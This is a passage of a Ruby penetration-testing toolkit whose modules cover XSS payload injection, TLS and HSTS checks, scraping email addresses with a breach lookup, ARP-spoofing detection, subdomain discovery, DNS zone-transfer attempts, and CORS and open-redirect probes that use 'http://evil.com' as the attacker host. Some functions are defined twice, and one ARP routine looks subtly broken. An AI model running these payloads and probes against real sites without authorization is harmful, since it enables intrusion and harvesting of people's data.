  "<iframe src=javascript:alert('XSS')>",
  "<input autofocus onfocus=alert('XSS')>",
  "<body onload=alert('XSS')>",
  "<details open ontoggle=alert('XSS')></details>",
  "';alert(String.fromCharCode(88,83,83));//",
  "javascript:alert('XSS')",
  "<math><mtext><style>@keyframes x{}</style><mprescripts></mprescripts><script>alert('XSS')</script>"
]

def xss_scanner
  require 'net/http'
  require 'uri'
  require 'openssl'
  require 'nokogiri'
  require 'json'

  puts "\n#{BRIGHT_GREEN}=== XSS Scanner ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter the target URL (e.g., http://example.com): #{RESET}"
  target_url = gets.chomp.strip
  uri = URI.parse(target_url) rescue nil

  unless uri && uri.scheme && uri.host
    puts "#{BRIGHT_RED}Invalid URL. Please try again.#{RESET}"
    return
  end

  puts "#{BRIGHT_YELLOW}Scanning the website for potential XSS vulnerabilities...#{RESET}"
  display_loading("Testing payloads...", 2)

  begin
    http = Net::HTTP.new(uri.host, uri.port)
    if uri.scheme == 'https'
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    end
    response = http.get(uri.request_uri)
    html_response = response.body
  rescue => e
    puts "#{BRIGHT_RED}Error during HTTP request: #{e.message}#{RESET}"
    return
  end

  document = Nokogiri::HTML(html_response)
  input_fields = document.css('input[name], textarea[name], select[name]')
  if input_fields.empty?
    puts "#{BRIGHT_YELLOW}No input fields found. Aborting XSS test.#{RESET}"
    return
  end

  puts "\n#{BRIGHT_GREEN}Found #{input_fields.size} input field(s):#{RESET}"
  input_fields.each_with_index do |field, index|
    puts "  • Input ##{index + 1}: name='#{field['name']}', type='#{field['type'] || 'unknown'}'"
  end

  vulnerabilities = []
  input_fields.each do |field|
    field_name = field['name']
    XSS_PAYLOADS.each do |payload|
      test_uri = URI(uri.to_s)
      test_params = URI.decode_www_form(test_uri.query || '') << [field_name, payload]
      test_uri.query = URI.encode_www_form(test_params)

      begin
        resp = Net::HTTP.get_response(test_uri)
      rescue => e
        puts "#{BRIGHT_YELLOW}Skipped test for #{field_name} with payload due to: #{e.message}#{RESET}"
        next
      end

      if resp.code == '200' && resp.body.include?(payload)
        puts "#{BRIGHT_RED}Potential XSS Detected on '#{field_name}' with payload: #{payload}#{RESET}"
        vulnerabilities << {
          field: field_name,
          payload: payload,
          url_tested: test_uri.to_s,
          response_code: resp.code
        }
      else
        puts "Payload didn't trigger: #{payload}"
      end
    end
  end

  if vulnerabilities.empty?
    puts "\n#{BRIGHT_GREEN}No XSS vulnerabilities detected.#{RESET}"
  else
    out_file = "xss_scan_results_#{Time.now.to_i}.json"
    File.open(out_file, 'w') do |f|
      f.write(JSON.pretty_generate({
        target: uri.to_s,
        timestamp: Time.now.iso8601,
        results: vulnerabilities
      }))
    end
    puts "\n#{BRIGHT_RED}Potential vulnerabilities saved to: #{out_file}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# HTTPS ANALYSIS OF A TARGET WEBSITE FUNCTION (#13)
def https_analysis
  require 'socket'
  require 'openssl'
  require 'net/http'
  require 'uri'
  require 'timeout'

  puts "\n#{BRIGHT_GREEN}=== HTTPS Analysis ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter the target URL or domain (e.g., https://example.com or example.com): #{RESET}"
  raw = gets.chomp.strip

  target = raw =~ /\Ahttps?:\/\//i ? raw : "https://#{raw}"

  begin
    uri = URI.parse(target)
    raise if uri.scheme != 'https' || !uri.host
  rescue
    puts "#{BRIGHT_RED}[!] Invalid HTTPS URL or domain: #{raw}#{RESET}"
    return
  end

  host = uri.host
  port = uri.port || 443

  puts "\n#{BRIGHT_YELLOW}Analyzing HTTPS configuration for #{uri}...#{RESET}\n"

  # === SSL/TLS Certificate Info ===
  begin
    Timeout.timeout(5) do
      tcp = TCPSocket.new(host, port)
      ctx = OpenSSL::SSL::SSLContext.new
      ssl = OpenSSL::SSL::SSLSocket.new(tcp, ctx)
      ssl.hostname = host
      ssl.connect
      cert = ssl.peer_cert

      puts "=== SSL/TLS Certificate Information ==="
      puts "Subject           : #{cert.subject}"
      puts "Issuer            : #{cert.issuer}"
      puts "Valid From        : #{cert.not_before}"
      puts "Valid To          : #{cert.not_after}"
      puts "Signature Alg     : #{cert.signature_algorithm}"
      days_left = ((cert.not_after - Time.now) / 86400).to_i
      puts "Certificate valid for another #{days_left} days.\n\n"

      ssl.close
      tcp.close
    end
  rescue => e
    puts "#{BRIGHT_RED}[!] Error retrieving certificate: #{e.message}#{RESET}"
    return
  end

  # === HSTS Check ===
  begin
    http = Net::HTTP.new(host, port)
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    res = http.get(uri.request_uri)
    puts "=== HTTP Strict Transport Security (HSTS) Check ==="
    if res['strict-transport-security']
      puts "#{BRIGHT_GREEN}HSTS is enabled: #{res['strict-transport-security']}#{RESET}\n\n"
    else
      puts "#{BRIGHT_RED}HSTS is not enabled.#{RESET}\n\n"
    end
  rescue => e
    puts "#{BRIGHT_RED}[!] Failed to perform HSTS check: #{e.message}#{RESET}"
  end

  # === Supported TLS Versions & Cipher Suites ===
  puts "=== Supported TLS Versions & Cipher Suites ==="
  protocols = {
    'TLSv1.0' => :TLSv1,
    'TLSv1.1' => :TLSv1_1,
    'TLSv1.2' => :TLSv1_2,
    'TLSv1.3' => :TLSv1_3
  }

  protocols.each do |label, version_sym|
    begin
      Timeout.timeout(5) do
        s_tcp  = TCPSocket.new(host, port)
        s_ctx  = OpenSSL::SSL::SSLContext.new
        s_ctx.ssl_version = version_sym
        s_sock = OpenSSL::SSL::SSLSocket.new(s_tcp, s_ctx)
        s_sock.hostname = host
        s_sock.connect
        cipher = s_sock.cipher
        puts "#{BRIGHT_GREEN}Supported: #{label} — Cipher: #{cipher[0]} (#{cipher[1]}/#{cipher[2]} bits)#{RESET}"
        s_sock.close
        s_tcp.close
      end
    rescue => e
      puts "#{BRIGHT_RED}Not Supported: #{label}#{RESET}"
    end
  end

  puts "\n#{BRIGHT_GREEN}=== HTTPS Analysis Complete ===#{RESET}\n\n"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- Function 14: OSINT Email Harvest & Breach Lookup ---
def osint_email_breach_lookup
  require 'nokogiri'
  require 'open-uri'
  require 'uri'
  require 'json'
  require 'timeout'

  begin
    require 'httparty'
  rescue LoadError
    puts "#{BRIGHT_RED}[!] Missing 'httparty' gem. Install with: gem install httparty#{RESET}"
    return
  end

  print "#{BRIGHT_CYAN}Enter target URL (e.g. https://example.com): #{RESET}"
  input = gets.chomp.strip
  target = input =~ /\Ahttps?:\/\//i ? input : "https://#{input}"

  puts "#{BRIGHT_YELLOW}Fetching and parsing HTML…#{RESET}"
  html = ""
  begin
    Timeout.timeout(10) do
      html = URI.open(target, "User-Agent" => "OSINT-Email-Scanner/1.0").read
    end
  rescue => e
    puts "#{BRIGHT_RED}Failed to fetch #{target}: #{e.message}#{RESET}"
    return
  end

  doc = Nokogiri::HTML(html)

  # Extract text and scripts, then search for emails
  text_blobs = []
  text_blobs << doc.xpath("//text()").map(&:text)
  text_blobs << doc.css("script").map(&:text)
  corpus = text_blobs.flatten.join(" ")
  emails = corpus.scan(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/).uniq

  if emails.empty?
    puts "#{BRIGHT_YELLOW}No email addresses found on #{target}.#{RESET}"
    return
  end

  $gathered_data[:osint_emails] = emails

  puts "\n#{BRIGHT_GREEN}=== Found Email Addresses ===#{RESET}"
  puts "| %-3s | %-40s |" % ["#", "Email"]
  puts "-" * 48
  emails.each_with_index do |email, i|
    puts "| %-3d | %-40s |" % [i+1, email]
  end

  api_key = ENV["HIBP_API_KEY"]
  unless api_key && !api_key.empty?
    print "\n#{BRIGHT_CYAN}Enter your HaveIBeenPwned API Key (or leave blank to skip breach lookup): #{RESET}"
    api_key = gets.chomp.strip
  end

  breach_results = {}

  if api_key && !api_key.empty?
    puts "\n#{BRIGHT_YELLOW}Querying HaveIBeenPwned for breaches…#{RESET}"
    emails.each do |email|
      begin
        url = URI("https://haveibeenpwned.com/api/v3/breachedaccount/#{URI.encode_www_form_component(email)}?truncateResponse=false")
        res = HTTParty.get(
          url,
          headers: {
            "hibp-api-key" => api_key,
            "User-Agent"   => "OSINT-Email-Scanner/1.0"
          },
          timeout: 10
        )

        case res.code
        when 200
          breaches = JSON.parse(res.body).map { |b| b["Name"] rescue nil }.compact
          breach_results[email] = breaches
        when 404
          breach_results[email] = []
        else
          breach_results[email] = ["Error: HTTP #{res.code}"]
        end

      rescue => e
        breach_results[email] = ["Error: #{e.class} – #{e.message}"]
      end
    end

    $gathered_data[:email_breaches] = breach_results

    puts "\n#{BRIGHT_GREEN}=== Breach Lookup Results ===#{RESET}"
    puts "| %-40s | %-15s | %-20s |" % ["Email", "# Breaches", "Sample Breach"]
    puts "-" * 83
    breach_results.each do |email, list|
      count = list.size
      sample = list.first || "(none)"
      puts "| %-40s | %-15d | %-20s |" % [email, count, sample[0..19]]
    end

  else
    puts "#{BRIGHT_YELLOW}Skipped breach lookup (no API key provided).#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- Function 15: Telegram Bot Notifications ---
def telegram_bot_alerts
  begin
    require 'httparty'
  rescue LoadError
    puts "#{BRIGHT_RED}[!] 'httparty' gem missing. Run: gem install httparty#{RESET}"
    return
  end

  summary = []
  if $gathered_data[:service_fingerprints]&.any?
    services = $gathered_data[:service_fingerprints].map { |svc, count| "#{svc}(#{count})" }.join(', ')
    summary << "🛰️ Services:\n#{services}"
  end

  if $gathered_data[:osint_emails]&.any?
    summary << "📧 Emails:\n" + $gathered_data[:osint_emails].join(', ')
  end

  if $gathered_data[:email_breaches]&.any?
    breaches = $gathered_data[:email_breaches].map { |email, list| "#{email} (#{list.size} breaches)" }.join("\n")
    summary << "💥 Breaches:\n#{breaches}"
  end

  summary_text = summary.empty? ? "📡 No data available to report." : summary.join("\n\n")

  print "#{BRIGHT_CYAN}Enter Telegram Bot Token: #{RESET}"
  token = gets.chomp.strip
  print "#{BRIGHT_CYAN}Enter Telegram Chat ID: #{RESET}"
  chat_id = gets.chomp.strip

  if token.empty? || chat_id.empty?
    puts "#{BRIGHT_RED}[!] Token or Chat ID cannot be blank. Aborting.#{RESET}"
    return
  end

  url = "https://api.telegram.org/bot#{token}/sendMessage"
  resp = HTTParty.post(
    url,
    headers: { 'Content-Type' => 'application/json' },
    body: {
      chat_id: chat_id,
      text: "[Pentest Summary 📋]\n\n#{summary_text}"
    }.to_json
  )

  if resp.code == 200 && resp.parsed_response["ok"]
    puts "#{BRIGHT_GREEN}✅ Alert sent successfully to Telegram!#{RESET}"
  else
    puts "#{BRIGHT_RED}❌ Failed to send alert. Response: #{resp.body}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# GLOBAL VARIABLE TO STORE HISTORICAL ARP SCAN DATA (#16 - #17)
$arp_scan_history = []

# Function to perform ARP Scanning and save data (#16)
def arp_scanning
  puts "#{BRIGHT_GREEN}=== ARP Scanning ===#{RESET}"
  puts "#{BRIGHT_YELLOW}ARP scanning discovers active devices and MAC addresses on your LAN.#{RESET}"
  display_loading("Scanning local ARP table", 2)

  # Execute Linux-compatible ARP command
  arp_output = `arp -an`
  if arp_output.empty?
    puts "#{BRIGHT_RED}No entries found. Make sure your device is connected to the network.#{RESET}"
    return
  end

  parsed_entries = parse_arp_entries(arp_output)
  if parsed_entries.empty?
    puts "#{BRIGHT_RED}No valid IP/MAC pairs detected.#{RESET}"
    return
  end

  puts "#{BRIGHT_GREEN}Found #{parsed_entries.size} device(s):#{RESET}"
  parsed_entries.each { |entry| puts "  IP: #{entry[:ip]}  |  MAC: #{entry[:mac]}" }

  $arp_scan_history << parsed_entries

  print "#{BRIGHT_YELLOW}Save results to file? (y/n): #{RESET}"
  save = gets.chomp.downcase
  if save == 'y'
    fname = "arp_scan_#{Time.now.to_i}.txt"
    File.open(fname, "w") do |f|
      parsed_entries.each { |entry| f.puts("IP: #{entry[:ip]}  MAC: #{entry[:mac]}") }
    end
    puts "#{BRIGHT_GREEN}Saved to #{fname}#{RESET}"
  end

  puts "#{BRIGHT_GREEN}ARP scan completed.#{RESET}"
end

#----------------------------------------------------------------------------------------------------------------------------------------
# Helper: Parse ARP output into structured entries
def parse_arp_entries(raw_arp_data)
  entries = []
  raw_arp_data.each_line do |line|
    ip  = line[/\((\d{1,3}(?:\.\d{1,3}){3})\)/, 1]
    mac = line[/..:..:..:..:..:../i]
    next if ip.nil? || mac.nil? || mac == "ff:ff:ff:ff:ff:ff"
    entries << { ip: ip, mac: mac.downcase }
  end
  entries
end

#----------------------------------------------------------------------------------------------------------------------------------------
# Function to detect ARP spoofing (#17)
def detect_arp_spoofing
  if $arp_scan_history.size < 2
    puts "#{BRIGHT_YELLOW}[!] At least 2 ARP scans are required to detect spoofing. Run multiple scans first.#{RESET}"
    return
  end

  mac_change_count = Hash.new(0)
  ip_change_details = Hash.new { |h, k| h[k] = [] }

  $arp_scan_history.each do |scan|
    scan.each do |entry|
      ip = entry[:ip]
      mac = entry[:mac]
      unless ip_change_details[ip].include?(mac)
        ip_change_details[ip] << mac
      end
    end
  end

  ip_change_details.each do |ip, mac_list|
    mac_change_count[ip] = mac_list.size
  end

  perform_frequency_analysis(mac_change_count, ip_change_details)
end

#----------------------------------------------------------------------------------------------------------------------------------------
# Function to perform frequency analysis (called from detect_arp_spoofing)
def perform_frequency_analysis(mac_change_count, ip_change_details)
  puts "\n#{BRIGHT_YELLOW}=== ARP Spoofing Detection Results ===#{RESET}"
  suspicious = []

  mac_change_count.each do |ip, count|
    if count > 1
      puts "#{BRIGHT_RED}⚠️ IP #{ip} has changed MAC addresses #{count} times.#{RESET}"
      puts "#{BRIGHT_YELLOW}MAC History:#{RESET}"
      ip_change_details[ip].each_with_index do |mac, i|
        puts "  [#{i + 1}] #{mac}"
      end
      suspicious << ip
    else
      puts "#{BRIGHT_GREEN}✔️ IP #{ip} has stable MAC: #{ip_change_details[ip].first}#{RESET}"
    end
  end

  if suspicious.empty?
    puts "\n#{BRIGHT_GREEN}✅ No ARP spoofing behavior detected.#{RESET}"
  else
    puts "\n#{BRIGHT_YELLOW}⚠️ Investigate suspicious IPs listed above for spoofing manually.#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Enhanced function to detect ARP spoofing (#17)
def detect_arp_spoofing
  puts "#{BRIGHT_GREEN}=== Detecting ARP Spoofing ===#{RESET}"

  # Check if there is enough historical data to compare
  if $arp_scan_history.size < 3
    puts "#{BRIGHT_RED}Not enough historical ARP data. Run ARP scan at least 3 times.#{RESET}"
    return
  end

  spoofing_detected = false
  mac_change_count = Hash.new(0)
  ip_change_details = Hash.new { |hash, key| hash[key] = [] }

  puts "\n#{BRIGHT_YELLOW}Analyzing the last three ARP scans...#{RESET}"
  latest_scan = parse_arp_entries($arp_scan_history[-1].join("\n"))
  previous_scans = $arp_scan_history[-3..-2].map { |scan| parse_arp_entries(scan.join("\n")) }

  # Display the 3 latest scans for transparency
  puts "#{BRIGHT_CYAN}\nComparison Data from Last 3 Scans:#{RESET}"
  $arp_scan_history.last(3).each_with_index do |scan_data, index|
    puts "\n#{BRIGHT_GREEN}Scan #{index + 1}:#{RESET}"
    scan_data.each { |line| puts "  #{line}" }
  end

  # Begin cross-checking
  latest_scan.each do |entry|
    ip = entry[:ip]
    current_mac = entry[:mac]

    previous_scans.each_with_index do |prev_scan, i|
      prev_entry = prev_scan.find { |e| e[:ip] == ip }
      if prev_entry
        prev_mac = prev_entry[:mac]
        ip_change_details[ip] << prev_mac unless ip_change_details[ip].include?(prev_mac)

        if prev_mac != current_mac
          puts "#{BRIGHT_RED}⚠️ IP #{ip} changed MAC from #{prev_mac} to #{current_mac} (Scan #{i + 1} → Now)#{RESET}"
          mac_change_count[ip] += 1
          spoofing_detected = true
        end
      else
        puts "#{BRIGHT_YELLOW}🆕 IP #{ip} appeared for the first time with MAC #{current_mac}.#{RESET}"
      end
    end

    # Add current MAC to history if not duplicate
    ip_change_details[ip] << current_mac unless ip_change_details[ip].include?(current_mac)
  end

  # Run frequency analysis
  perform_frequency_analysis(mac_change_count, ip_change_details)
end
def parse_arp_entries(raw_arp_data)
  entries = []
  raw_arp_data.each_line do |line|
    ip  = line[/\((\d{1,3}(?:\.\d{1,3}){3})\)/, 1]
    mac = line[/..:..:..:..:..:../i]
    next if ip.nil? || mac.nil? || mac == "ff:ff:ff:ff:ff:ff"
    entries << { ip: ip, mac: mac.downcase }
  end
  entries
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- Function 19: CT Subdomain & Origin IP Discovery ---
def ct_subdomain_origin_discovery
  require 'net/http'
  require 'uri'
  require 'json'
  require 'resolv'

  print "#{BRIGHT_CYAN}Enter domain (e.g. example.com): #{RESET}"
  domain = gets.chomp.strip

  url = URI("https://crt.sh/?q=#{domain}&output=json")
  puts "#{BRIGHT_YELLOW}Fetching certificate transparency logs…#{RESET}"
  begin
    res = Net::HTTP.get(url)
    entries = JSON.parse(res)
  rescue => e
    puts "#{BRIGHT_RED}Error fetching/parsing CRT data: #{e.message}#{RESET}"
    return
  end

  # Extract subdomains and resolve IPs
  subs = entries.map { |e| e["name_value"] }
                .flat_map { |s| s.split("\n") }
                .uniq
                .reject { |s| s.include?('*') }

  resolved = subs.map do |sub|
    begin
      ip = Resolv.getaddress(sub)
      { sub: sub, ip: ip }
    rescue
      nil
    end
  end.compact.uniq { |entry| entry[:sub] }

  subdomains = resolved.map { |r| r[:sub] }
  ip_addresses = resolved.map { |r| r[:ip] }

  # Store to global data
  $gathered_data[:ct_subdomains] = subdomains
  $gathered_data[:ct_origin_ips] = ip_addresses

  puts "\n#{BRIGHT_GREEN}=== Discovered Subdomains & Origin IPs ===#{RESET}"
  resolved.each do |entry|
    puts " • #{entry[:sub].ljust(40)} → #{entry[:ip]}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- Function 20: DNS Zone Transfer Tester ---
def dns_zone_transfer_tester
  require 'dnsruby'
  require 'json'

  print "#{BRIGHT_CYAN}Enter domain (e.g. example.com): #{RESET}"
  domain = gets.chomp.strip

  resolver = Dnsruby::Resolver.new
  begin
    ns_records = resolver.query(domain, 'NS').answer
                        .select { |r| r.type == 'NS' }
                        .map    { |r| r.nsdname.to_s }
  rescue => e
    puts "#{BRIGHT_RED}DNS NS query failed: #{e.message}#{RESET}"
    return
  end

  if ns_records.empty?
    puts "#{BRIGHT_RED}No NS records found for domain #{domain}.#{RESET}"
    return
  end

  puts "\n#{BRIGHT_YELLOW}Found NS servers: #{ns_records.join(', ')}#{RESET}"
  results = {}

  ns_records.each do |ns|
    puts "#{BRIGHT_YELLOW}Attempting AXFR against: #{ns}#{RESET}"
    begin
      zt = Dnsruby::ZoneTransfer.new
      zt.server = ns
      zone_data = zt.transfer(domain)
      rrset = zone_data.map(&:to_s)
      results[ns] = rrset
      puts "#{BRIGHT_GREEN}AXFR Successful! Retrieved #{rrset.size} records.#{RESET}"
    rescue => e
      puts "#{BRIGHT_RED}AXFR Failed on #{ns} (#{e.class}: #{e.message})#{RESET}"
      results[ns] = []
    end
  end

  # Store in global gathered data for cross-module use
  $gathered_data[:zone_transfers] = results

  puts "\n#{BRIGHT_GREEN}=== Zone Transfer Summary ===#{RESET}"
  results.each do |ns, records|
    if records.empty?
      puts " • #{ns.ljust(30)} → No AXFR allowed"
    else
      puts " • #{ns.ljust(30)} → Retrieved #{records.size} records"
    end
  end

  # Optional: Save the result
  timestamp = Time.now.to_i
  file = "zone_transfer_results_#{timestamp}.json"
  File.write(file, JSON.pretty_generate(results))
  puts "\n#{BRIGHT_GREEN}Results saved to #{file}#{RESET}"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- Function 21: CORS Misconfiguration Scanner ---
def cors_scanner
  require 'net/http'
  require 'uri'
  require 'json'

  print "#{BRIGHT_CYAN}Enter target URL (e.g. https://example.com): #{RESET}"
  raw = gets.chomp.strip
  raw = "https://#{raw}" unless raw =~ %r{\Ahttps?://}i

  begin
    uri = URI.parse(raw)
    raise if uri.host.nil?
  rescue
    puts "#{BRIGHT_RED}[!] Invalid URL provided.#{RESET}"
    return
  end

  test_origin = "http://evil.com"
  req = Net::HTTP::Get.new(uri)
  req['Origin'] = test_origin

  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = uri.scheme == 'https'
  http.open_timeout = 5
  http.read_timeout = 5

  puts "#{BRIGHT_YELLOW}Sending CORS probe with Origin: #{test_origin}#{RESET}"
  begin
    res = http.request(req)
  rescue => e
    puts "#{BRIGHT_RED}HTTP request failed: #{e.class} – #{e.message}#{RESET}"
    return
  end

  aca_origin = res['Access-Control-Allow-Origin']
  aca_credentials = res['Access-Control-Allow-Credentials']
  vuln = aca_origin == '*' || aca_origin == test_origin

  # Save structured data
  result = {
    url:               uri.to_s,
    tested_origin:     test_origin,
    allowed_origin:    aca_origin || 'none',
    allow_credentials: aca_credentials || 'none',
    vulnerable:        vuln
  }

  $gathered_data[:cors] ||= []
  $gathered_data[:cors] << result

  # Display summary
  puts "\n#{BRIGHT_GREEN}=== CORS Scan Result ===#{RESET}"
  puts "URL                  : #{result[:url]}"
  puts "Allow-Origin         : #{result[:allowed_origin]}"
  puts "Allow-Credentials    : #{result[:allow_credentials]}"
  puts "Misconfigured?       : #{vuln ? "#{BRIGHT_RED}YES#{RESET}" : "#{BRIGHT_GREEN}NO#{RESET}"}"

  # Optional: Save to file
  file = "cors_scan_result_#{Time.now.to_i}.json"
  File.write(file, JSON.pretty_generate(result))
  puts "#{BRIGHT_GREEN}Results saved to #{file}#{RESET}"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- Function 22: Open Redirect Finder ---
def open_redirect_scanner
  require 'net/http'
  require 'uri'
  require 'json'

  puts "\n#{BRIGHT_GREEN}=== Open Redirect Scanner ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter base URL (e.g. https://example.com/page): #{RESET}"
  base = gets.chomp.strip
  print "#{BRIGHT_CYAN}Enter redirect parameter name (e.g. next, url, redirect): #{RESET}"
  param = gets.chomp.strip

  payload = "http://evil.com"
  begin
    uri = URI.parse(base)
    raise if uri.host.nil?
  rescue
    puts "#{BRIGHT_RED}[!] Invalid base URL.#{RESET}"
    return
  end

  # Append payload to the query
  q = URI.decode_www_form(uri.query.to_s) << [param, payload]
  uri.query = URI.encode_www_form(q)

  puts "#{BRIGHT_YELLOW}Testing redirect with crafted payload: #{payload}#{RESET}"
  begin
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = (uri.scheme == 'https')
    http.open_timeout = http.read_timeout = 5
    req = Net::HTTP::Get.new(uri.request_uri)
    res = http.request(req)
  rescue => e
    puts "#{BRIGHT_RED}[!] HTTP request failed: #{e.class} – #{e.message}#{RESET}"
    return
  end

  is_redirect = res.is_a?(Net::HTTPRedirection) && res['location'] == payload

  result = {
    test_url:   uri.to_s,
    redirect:   res['location'] || 'none',
    vulnerable: is_redirect
  }

  $gathered_data[:open_redirects] ||= []
  $gathered_data[:open_redirects] << result

  # Output results
  puts "\n#{BRIGHT_GREEN}=== Open Redirect Test Result ===#{RESET}"
  puts "Test URL        : #{result[:test_url]}"
  puts "Location Header : #{result[:redirect]}"
  puts "Vulnerable?     : #{is_redirect ? "#{BRIGHT_RED}YES#{RESET}" : "#{BRIGHT_GREEN}NO#{RESET}"}"

  # Optional: Save to file
  filename = "open_redirect_#{Time.now.to_i}.json"
  File.write(filename, JSON.pretty_generate(result))
  puts "#{BRIGHT_GREEN}Result saved to #{filename}#{RESET}"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function 23: Automated API Setup
def automated_api_setup
  require 'json'
  require 'httparty'

  puts "\n#{BRIGHT_GREEN}=== Automated API Setup ===#{RESET}"
  puts "#{BRIGHT_YELLOW}This tool will configure your OpenAI API key for assistant integration.#{RESET}"

  # Step 1: Prompt for API key
  print "#{BRIGHT_CYAN}Enter your OpenAI API Key: #{RESET}"
  api_key = gets.chomp.strip

  if api_key.empty?
    puts "#{BRIGHT_RED}[!] API key cannot be empty. Setup aborted.#{RESET}"
    return
  end

  # Step 2: Save API key to config file
  config_file = File.expand_path("~/.pentest_assistant_config.json")
  begin
    config_data = { "OPENAI_API_KEY" => api_key }
    File.write(config_file, JSON.pretty_generate(config_data))
    puts "#{BRIGHT_GREEN}✅ API key saved to #{config_file}#{RESET}"
  rescue => e
    puts "#{BRIGHT_RED}[!] Failed to save API key: #{e.message}#{RESET}"
    return
  end

  # Step 3: Validate key with test request
  puts "#{BRIGHT_YELLOW}Validating your API key with a test request…#{RESET}"
  begin
    valid = validate_openai_api_key(api_key)
    if valid
      puts "#{BRIGHT_GREEN}✅ API key is valid! Assistant setup is complete.#{RESET}"
    else
      puts "#{BRIGHT_RED}[!] API key validation failed. Please double-check and try again.#{RESET}"
    end
  rescue => e
    puts "#{BRIGHT_RED}[!] Validation failed: #{e.class} - #{e.message}#{RESET}"
  end
end

# Helper function to validate OpenAI API key
def validate_openai_api_key(api_key)
  require 'httparty'

  api_url = "https://api.openai.com/v1/chat/completions"
  headers = {
    "Authorization" => "Bearer #{api_key}",
    "Content-Type" => "application/json"
  }
  body = {
    model: "gpt-3.5-turbo",
    messages: [{ role: "user", content: "Ping" }]
  }

  response = HTTParty.post(api_url, body: body.to_json, headers: headers, timeout: 10)
  response.code == 200
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function 24: ChatGPT Assistant Support Tool
require 'httparty'
require 'json'

class ChatGPTService
  include HTTParty
  base_uri 'https://api.openai.com/v1'

  def initialize(message, model = 'gpt-3.5-turbo')
    config_path = File.expand_path("~/.pentest_assistant_config.json")
    unless File.exist?(config_path)
      raise "Missing config file: Run automated API setup first (Function 23)"
    end

    config = JSON.parse(File.read(config_path))
    @api_key = config["OPENAI_API_KEY"]
    raise "OpenAI API key not found in config file." if @api_key.to_s.strip.empty?

    @message = message
    @model = model
  end

  def call
    response = self.class.post(
      "/chat/completions",
      headers: request_headers,
      body: request_body.to_json,
      timeout: 10
    )
    parse_response(response)
  rescue StandardError => e
    "❌ Error: #{e.message}"
  end

  private

  def request_headers
    {
      'Authorization' => "Bearer #{@api_key}",
      'Content-Type' => 'application/json'
    }
  end

  def request_body
    {
      model: @model,
      messages: [
        { role: 'user', content: @message }
      ]
    }
  end

  def parse_response(response)
    if response.code == 200
      content = response.parsed_response.dig("choices", 0, "message", "content")
      content || "[No response content]"
    else
      "[API Error #{response.code}]: #{response.dig("error", "message") || response.message}"
    end
  end
end

#----------------------------------------------------------------------------------------------------------------------------------------
# Interactive AI Chat Assistant Loop
def chatgpt_assistant
  puts "\n#{BRIGHT_GREEN}=== ChatGPT AI Assistant ===#{RESET}"
  puts "#{BRIGHT_YELLOW}Type 'stop' to exit the ChatGPT assistant.#{RESET}\n"

  loop do
    print "#{BRIGHT_CYAN}Ask ChatGPT something: #{RESET}"
    user_input = gets.chomp.strip
    break if user_input.downcase == "stop"

    begin
      assistant = ChatGPTService.new(user_input)
      response = assistant.call
      puts "\n#{BRIGHT_GREEN}Response:#{RESET}\n#{response}\n\n"
    rescue => e
      puts "#{BRIGHT_RED}[!] #{e.message}#{RESET}"
    end
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Global Exception Logging Function (Background Tool for Error Reporting)
require 'time'

def log_error(function_name, error, input_data = nil)
  timestamp = Time.now.utc.iso8601.gsub(":", "-")  # Safe filename for Linux
  file_name = "error_report_#{timestamp}.txt"

  begin
    File.open(file_name, "w") do |file|
      file.puts "=== ERROR REPORT ==="
      file.puts "Timestamp     : #{Time.now.utc}"
      file.puts "Function Name : #{function_name}"
      file.puts "Input Data    : #{input_data.inspect}" if input_data
      file.puts "Error Message : #{error.message}"
      file.puts "Stack Trace:"
      file.puts error.backtrace.join("\n")
      file.puts "===================="
    end

    puts "#{BRIGHT_RED}⚠ An error occurred. Logged in: #{file_name}#{RESET}"
  rescue => file_error
    puts "#{BRIGHT_RED}Failed to log error due to: #{file_error.message}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# --- Helpers for Domain Info Gathering (#25) ---
def section_header(title)
  puts "\n#{BRIGHT_CYAN}=== #{title} ===#{RESET}"
end

def print_kv(key, value, indent: 2)
  spaces = ' ' * indent
  printf("%s#{BRIGHT_YELLOW}%-15s#{RESET}: %s\n", spaces, key, value)
end

# --- Enhanced Domain Information Gathering Function (#25) ---
def domain_info_gather
  require 'resolv'
  require 'uri'
  require 'open3'
  require 'whois'
  require 'net/http'
  require 'timeout'
  require 'socket'

  section_header("Domain/Website Info Gathering")
  print "#{BRIGHT_CYAN}Enter a domain, IP, or URL: #{RESET}"
  input = gets.chomp.strip

  # Normalize
  host = begin URI.parse(input).host || input rescue input end.downcase
  is_ip = host =~ /\A\d+\.\d+\.\d+\.\d+\z/

  ### DNS PHASE ###
  unless is_ip
    section_header("1) DNS Records for #{host}")
    puts "#{BRIGHT_GREEN}Performing DNS lookup...#{RESET}"
    resolver = Resolv::DNS.new

    {
      "A"     => Resolv::DNS::Resource::IN::A,
      "AAAA"  => Resolv::DNS::Resource::IN::AAAA,
      "CNAME" => Resolv::DNS::Resource::IN::CNAME,
      "NS"    => Resolv::DNS::Resource::IN::NS,
      "MX"    => Resolv::DNS::Resource::IN::MX,
      "TXT"   => Resolv::DNS::Resource::IN::TXT
    }.each do |label, klass|
      records = begin
        resolver.getresources(host, klass).map do |r|
          case r
          when Resolv::DNS::Resource::IN::A, Resolv::DNS::Resource::IN::AAAA
            r.address.to_s
          when Resolv::DNS::Resource::IN::CNAME, Resolv::DNS::Resource::IN::NS
